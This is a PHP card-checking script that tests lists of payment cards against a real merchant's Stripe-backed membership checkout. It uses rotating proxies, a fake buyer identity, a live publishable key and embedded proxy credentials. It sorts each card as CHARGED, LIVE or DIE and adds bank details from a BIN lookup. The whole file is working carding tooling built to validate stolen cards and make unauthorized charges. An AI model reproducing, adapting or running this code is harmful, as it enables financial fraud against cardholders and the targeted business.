
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://www.kitchngiggles.com/membership-account/membership-checkout/?level=2" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'ybeynphq-rotate:yyotypam1z87', //=my id//
  2 => 'USER:PASS',
  3 => 'USER:PASS',
  4 => 'USER:PASS',
  5 => 'USER:PASS',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "🟢";
}
if (empty($ip1)){
$ip = "🔴";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=3324+Chapel+Street&billing_details[address][line2]=&billing_details[address][city]=Sugar+Land&billing_details[address][state]=Texas&billing_details[address][postal_code]=77479&billing_details[address][country]=US&billing_details[name]=David+johns&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Ff90f36a9b%3B+stripe-js-v3%2Ff90f36a9b&time_on_page=103936&key=pk_live_51IuhayKvkOAucWfnyWqtYDHx5EHeQfMlThk1n7ijDnHuRs0dZ1agTABqduLoOvlfmGSuM53ZDKOTC8zlPgF6gS7k00cFrTw0NO');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.kitchngiggles.com/membership-account/membership-checkout/?level=2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.kitchngiggles.com',
'method: POST',
'path: /membership-account/membership-checkout/?level=2',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: nitroCachedPage=1; pmpro_visit=1; hustle-hide-module-1=1',
'origin: https://www.kitchngiggles.com',
'referer: https://www.kitchngiggles.com/membership-account/membership-checkout/?level=2',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username='.$name.'&password=4430450078585337&password2=4430450078585337&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&delivery_day=Tuesday&delivery_address_line_1=3324+Chapel+Street&delivery_address_line_2=&zipcode=77479&bfirstname=David&blastname=johns&baddress1=3324+Chapel+Street&baddress2=&bcity=Sugar+Land&bstate=Texas&bzipcode=77479&bcountry=US&bphone=281-624-2001&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX5337&ExpirationMonth=06&ExpirationYear=2024');



$result2 = curl_exec($ch);
# ----------------[2req End]------------------#

#----------------[Bin Info]----------------#
$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];
#----------------[Bin Info End]----------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:succeeded '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: INSUFFICIENT FUNDS </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    exit;
    }

elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: incorrect_zip </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: insufficient funds </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    exit;
    }
    elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
        exit;
        }
    elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result:  transaction_not_allowed </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
    exit;
    }
    
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D 🆘  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ⛔ </span><br>';
}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR 📛 </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT 🚫 </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ❗ </span><br>';

}

elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 🛑 </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 💀 </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>☑️Result:cvc_check_pass </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result: Membership Confirmation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank for your support '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank you for your donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Membership Confirm '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You For Donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>☑️Result:incorrect_cvc </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>☑️Result:declined by your bank </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>☑️Result:not support this type of purchase </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>☑️Result:CARD NOT SUPPORTED </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman0_0 </span><br>';
exit;
}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}



curl_close($ch);
ob_flush();
#echo "</i><font size=2 color='grey'>proxy : $ip1</i></font><br>";
#echo $result1;
#echo $result2;

?>